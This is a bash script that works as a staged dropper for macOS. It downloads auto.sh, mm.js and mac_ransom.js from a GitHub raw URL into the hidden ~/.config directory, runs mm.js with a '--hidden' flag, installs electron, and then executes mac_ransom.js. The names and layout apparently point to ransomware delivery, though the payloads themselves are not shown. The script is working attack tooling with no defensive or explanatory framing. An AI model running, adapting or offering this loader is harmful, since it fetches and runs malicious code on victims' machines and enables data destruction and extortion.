#!/usr/bin/env bash
#
# Mac-only pipeline (stage 2):
#   1. Download auto.sh, mm.js, mac_ransom.js from GitHub (via wget)
#   2. Run: bash auto.sh mm.js --hidden
#   3. Run: npm install electron
#   4. Run: bash auto.sh mac_ransom.js            (no --hidden)
#
# Each step only starts if the previous one exited 0.
#
set -euo pipefail

GITHUB_USER="rahul-call"
GITHUB_REPO="inner"
BRANCH="main/ror"                       # main / master / tag
WORKDIR="$HOME/.config"  # where the files land
FILES=("auto.sh" "mm.js" "mac_ransom.js")
# -----------------------------------------

BASE_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${BRANCH}"

# ---------- Pre-flight ----------
if ! command -v wget >/dev/null 2>&1; then
  echo "ERROR: wget not found. Install it first with:  brew install wget" >&2
  exit 1
fi

if ! command -v npm >/dev/null 2>&1; then
  echo "ERROR: npm not found. Install Node.js first (e.g. brew install node)." >&2
  exit 1
fi

mkdir -p "$WORKDIR"
cd "$WORKDIR"

# ---------- 1. Download ----------
for f in "${FILES[@]}"; do
  echo "→ Downloading ${f} ..."
  wget --quiet --show-progress -O "$f" "${BASE_URL}/${f}"
done
chmod +x auto.sh

# ---------- 2. First run ----------
echo
echo "→ Running: bash auto.sh mm.js --hidden"
if bash auto.sh mm.js --hidden; then
  echo "✔ Stage 1 finished successfully."
else
  echo "✘ Stage 1 failed (exit $?). Aborting." >&2
  exit 1
fi

# ---------- 3. Install electron ----------
echo
echo "→ Running: npm install electron"
if npm install electron; then
  echo "✔ npm install electron finished."
else
  echo "✘ npm install electron failed (exit $?). Aborting." >&2
  exit 1
fi

# ---------- 4. Second run ----------
echo
echo "→ Running: bash auto.sh mac_ransom.js"
if bash auto.sh mac_ransom.js; then
  echo "✔ Stage 2 finished successfully."
else
  echo "✘ Stage 2 failed (exit $?). Aborting." >&2
  exit 1
fi

echo
echo "✔ Full pipeline complete."
